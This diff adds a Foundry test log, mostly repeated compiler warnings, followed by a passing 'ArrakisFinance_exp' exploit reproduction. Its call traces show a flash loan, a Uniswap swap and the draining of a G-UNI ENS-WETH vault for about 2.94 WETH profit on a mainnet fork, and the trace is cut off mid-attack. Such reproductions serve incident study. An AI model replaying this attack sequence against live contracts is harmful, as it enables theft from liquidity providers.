@@ -1,0 +1,855 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 465.02ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/ArrakisFinance_exp.sol:ArrakisFinance_exp
+[PASS] testExploit() (gas: 2357050)
+Logs:
+  Attacker Before exploit WETH Balance: 0.000000000000000000
+  Vault WETH before: 6.233955217024577008
+  Vault WETH after: 0.744208051862832701
+  Attacker WETH profit: 2.941350352900037140
+  Attacker After exploit WETH Balance: 2.941350352900037140
+
+Traces:
+  [35881] ArrakisFinance_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25817965 [2.581e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44], "Attacker EOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], "G-UNI ENS-WETH vault")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ArrakisVaultV1: [0xd68b055fb444D136e3aC4df023f4C42334F06395], "ArrakisVaultV1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], "Uni V3 ENS/WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ENS: [0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72], "ENS")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], "Morpho Blue")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2554850] ArrakisFinance_exp::testExploit()
+    ├─ [3264] WETH::symbol() [staticcall]
+    │   └─ ← [Return] "WETH"
+    ├─ [2534] WETH::balanceOf(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit WETH Balance", val: 0, decimals: 18)
+    ├─ [2534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   └─ ← [Return] 6233955217024577008 [6.233e18]
+    ├─ [534] WETH::balanceOf(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [1054306] → new ArrakisFinanceExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 5264 bytes of code
+    ├─ [0] VM::prank(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44])
+    │   └─ ← [Return]
+    ├─ [1411077] ArrakisFinanceExploit::attack()
+    │   ├─ [1382394] Morpho Blue::flashLoan(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 1800000000000000000000 [1.8e21], 0x)
+    │   │   ├─ emit FlashLoan(param0: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 1800000000000000000000 [1.8e21])
+    │   │   ├─ [29962] WETH::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1800000000000000000000 [1.8e21])
+    │   │   │   ├─ emit Transfer(from: Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1800000000000000000000 [1.8e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x9ddf8259b5dfabc9e47e107236a6121103d753bff80b7accad156017de069d9a: 0x0000000000000000000000000000000000000000000002b8e0469f03d19cabc2 → 0x0000000000000000000000000000000000000000000002574c41ffd2da7cabc2
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000006194049f30f7200000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1342087] ArrakisFinanceExploit::onMorphoFlashLoan(1800000000000000000000 [1.8e21], 0x)
+    │   │   │   ├─ [24420] WETH::approve(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe279026bf05ee0992bface20ce72de1d435590f33b69a505e2c5ed8933adcf4a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [25317] ENS::approve(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xb25084536dfcbcb838cfff9b6adef016b685b73e4ac00a19fa53c7f564e9738a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [671516] Uni V3 ENS/WETH::swap(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true, 145416963504083295148 [1.454e20], 4295128740 [4.295e9], 0x)
+    │   │   │   │   ├─ [35465] ENS::transfer(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 13292512773372132065449 [1.329e22])
+    │   │   │   │   │   ├─ emit Transfer(from: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], to: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 13292512773372132065449 [1.329e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x3c6374891c6083b0aa4c9d6071a0aa4c75cef7901442333e2f9abc1955c7b80c: 0x00000000000000000000000000000000000000000000030534ead3eb314328f4 → 0x0000000000000000000000000000000000000000000000349e3edf49acdd284b
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000002d096abf4a1846600a9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2534] WETH::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 9922903337022300826 [9.922e18]
+    │   │   │   │   ├─ [7783] ArrakisFinanceExploit::uniswapV3SwapCallback(145416963504083295148 [1.454e20], -13292512773372132065449 [-1.329e22], 0x)
+    │   │   │   │   │   ├─ [6062] WETH::transfer(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], 145416963504083295148 [1.454e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], amount: 145416963504083295148 [1.454e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000006194049f30f7200000 → 0x000000000000000000000000000000000000000000000059b1f3c9561e4c2454
+    │   │   │   │   │   │   │   @ 0xc5bbd008f7d7fca2d33a7c0370e815f4a9ac2e4a0e748b07d7b79dd94d387b89: 0x00000000000000000000000000000000000000000000000089b53c02dfc0a29a → 0x0000000000000000000000000000000000000000000000086bc611ddb8947e46
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WETH::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 155339866841105595974 [1.553e20]
+    │   │   │   │   ├─ emit Swap(sender: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: 145416963504083295148 [1.454e20], amount1: -13292512773372132065449 [-1.329e22], sqrtPriceX96: 79077831700698859920587082 [7.907e25], liquidity: 0, tick: -138201 [-1.382e5])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68eaa: 0x000000000000000000000000000000067b909758c3ab75f30034e9976bc6538e → 0x0000000000000000000000000000000210b1b3042ff3aa9c022f7ee59d227f16
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c10: 0x00000000000000000000000000000003ac73e280baa071830836576286124099 → 0x00000000000000000000000000000004dfce67dc38feaf0bfa2e111a82d6920b
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c5: 0x000000000000000000000000000000080f512b34278ed904c939c3a0293da66c → 0x000000000000000000000000000000007cf11f28cc10478a392aa4dcdfab2c38
+    │   │   │   │   │   @ 0x5bbae0ba0219464a687460280b79150b5d52e01b18ab85b4833842b5e27a6642: 0x000000000000000000000000000000000e8c3cfe61c2ced99c6356348db667a4 → 0x00000000000000000000000000000000000fae15b67a91a277d0c2999fd20b66
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d86151a01: 0x016810679700001b260000000000165a4c93df372e6350ded00004dc7a51d685 → 0x01027a84e0000000000000000000179b68176f8bde5e01d6fc00022618024451
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68eab: 0x01662711dd00001b2600000000000d896162e99c58461c55b60003572be9662a → 0x010463da9a000000000000000000206c53486526b47b3660160003ab666ab4ac
+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa26: 0x01618b50d300001b260000000000000821184bf953478a18fe00000149cfe04c → 0x0108ff9ba40000000000000000002ded939302c9b979c89cce00070148843a8a
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707d: 0x01659ce2ef00001b2600000000000bb84ace7d7500542e9266000317c6cdb9d2 → 0x0104ee0988000000000000000000223d69dcd14e0c6d2423660003eacb866104
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c451: 0x016189c0ef00001b2600000000000007c9cec6dd36296b0431000000238142d4 → 0x0109012b880000000000000000002dedeadc87e5d697e7b19b0007026ed2d802
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087295: 0x00000000000000000000000000000000065d3c238f565a25ccbf9180e712e453 → 0x0000000000000000000000000000000008570ff0106807ab6bbc31c8dfacf08d
+    │   │   │   │   │   @ 0x2979857faf937b741547f2153f9684b5b8e6f461f39a8959920ee8f2deff2d31: 0x016a48e1df00001b26000000000025319c5e57af64aadfc3740006c534675dfa → 0x0100420a9800000000000000000008c4184cf713a81672f25800003d5decbcdc
+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f485: 0x000000000000000000000000000000000b0948856bb71039c384c350d7a6a22a → 0x0000000000000000000000000000000003a786fc353a52fb7c8a1e0446a10677
